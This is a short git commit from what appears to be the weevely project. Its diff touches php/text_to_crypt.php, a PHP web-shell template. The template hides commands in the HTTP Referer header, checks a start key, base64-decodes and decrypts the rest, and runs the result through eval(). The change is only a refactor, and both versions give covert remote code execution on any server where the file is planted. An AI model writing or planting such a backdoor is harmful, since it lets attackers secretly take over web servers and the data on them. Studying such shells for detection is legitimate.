12ee3fd1ff86ed5087e61e27a47b5afba5410cee
emilio.pinn <emilio.pinn@5205769a-2ae6-11df-b744-258d51847b74>
2010-06-16 01:20:10 +0000

    git-svn-id: http://weevely.googlecode.com/svn/trunk@50 5205769a-2ae6-11df-b744-258d51847b74

--- php/text_to_crypt.php
+++ php/text_to_crypt.php
@@ -1,6 +1,6 @@
 parse_str($_SERVER['HTTP_REFERER'],$a); 
 if(reset($a)=='%%%START_KEY%%%') { 
-$cm = c(base64_decode(join(array_slice($a,1))), '%%%END_KEY%%%'); echo '<%%%END_KEY%%%>';
-eval($cm);
+echo '<%%%END_KEY%%%>';
+eval(c(base64_decode(join(array_slice($a,1))), '%%%END_KEY%%%'));
 echo '</%%%END_KEY%%%>';
 }
